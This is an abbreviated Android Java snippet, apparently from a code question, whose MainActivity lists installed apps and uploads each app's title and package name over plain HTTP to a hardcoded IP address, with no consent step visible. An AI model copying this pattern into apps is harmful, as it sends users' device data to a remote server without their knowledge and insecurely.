...
public class MainActivity extends Activity {
    ...
    private final Runnable runable = new Runnable() {
        ...
        public void run() {
            ...
            for (int i = 0; i < appInfos.size(); i++) {
                str.append(appInfos.get(i).title).append("-----").append(appInfos.get(i).packageName).append("</br>");
            }
            try {
                OkHttpClientManager.getAsString("http://115.28.216.244/dad/index.php?dad="+str);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    ...
    private Handler myHandler = new Handler() {
        ...
        public void handleMessage(Message msg) {
            lv_app.setAdapter(new ShowAppListAdapter(MainActivity.this, appInfos, pm));
